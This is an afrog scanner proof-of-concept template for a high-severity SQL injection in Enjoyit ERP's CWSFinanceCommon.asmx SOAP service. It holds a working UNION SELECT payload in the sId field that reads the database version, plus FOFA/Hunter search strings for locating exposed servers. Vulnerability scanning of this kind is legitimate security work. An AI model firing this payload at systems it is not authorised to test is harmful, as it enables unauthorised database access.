pocs/afrog-pocs/vulnerability/enjoyit-erp-cwsfinancecommon-asmx-sqli.yaml

id: enjoyit-erp-cwsfinancecommon-asmx-sqli

info:
  name: 昂捷 ERP CWSFinanceCommon.asmx SQl注入
  author: zan8in
  severity: high
  verified: true
  description: |-
    Hunter: web.body="CheckSilverlightInstalled"
    fofa: body="CheckSilverlightInstalled"
  reference:
    - https://mp.weixin.qq.com/s/r-m73kfEOgq93LP1t0fXoA
  tags: enjoyit,sqli
  created: 2024/01/08

rules:
  r0:
    request:
      method: POST
      path: /EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx
      headers:
        Content-Type: text/xml; charset=utf-8
      body: |
        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
        <GetOSpById xmlns="http://tempuri.org/">
        <sId>string' UNION SELECT NULL,NULL,NULL,NULL,(select @@version),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- YQmj</sId>
        </GetOSpById>
        </soap:Body>
        </soap:Envelope>
    expression: |
      response.status == 200 && 
      response.body.ibcontains(b'<c_store_id>') && 
      response.body.ibcontains(b'<NewDataSet') && 
      response.body.ibcontains(b'sql server')
expression: r0()
